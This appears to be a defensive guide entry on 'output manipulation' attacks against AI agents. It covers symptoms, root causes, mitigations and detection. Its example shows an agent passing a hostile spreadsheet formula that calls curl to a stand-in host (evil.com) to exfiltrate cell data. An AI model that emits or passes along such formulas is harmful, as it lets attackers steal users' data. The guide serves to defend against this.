# Output Manipulation

## Issue: Malicious Inputs Craft Harmful Outputs

**Frequency**: Common

**Symptoms**
- Agent outputs executable code that wasn't intended
- Responses contain hidden commands
- Formatted output includes malicious content
- Agent assists in creating harmful content

**Root Cause**
- No output validation
- Agent doesn't recognize harmful patterns
- Rendering context enables attacks
- Content policy bypass through encoding

**Example**
```
User: "Help me format this data for my spreadsheet"
Input data: "=SYSTEM('curl http://evil.com?data=' & A1)"

Agent output: Passes formula directly to spreadsheet

Result: Spreadsheet executes malicious formula, exfiltrates data
```

**Mitigation Strategies**
1. **Output validation**: Check outputs for harmful patterns
2. **Content-type awareness**: Understand rendering context
3. **Encoding neutralization**: Escape dangerous characters
4. **Policy enforcement**: Block harmful content categories
5. **Sandboxed rendering**: Isolate output interpretation
6. **Format sanitization**: Strip executable elements

**Detection**
- Pattern matching for malicious outputs
- Monitor for encoded payloads
- Track output-related security alerts
- Test rendering contexts for vulnerabilities

## References
- [OWASP GenAI Q1 2026 Exploit Roundup](https://genai.owasp.org/2026/04/14/owasp-genai-exploit-round-up-report-q1-2026/)
- [IBM: OpenClaw Agentic AI Vulnerabilities](https://www.ibm.com/think/x-force/agentic-ai-growing-fast-vulnerabilities)
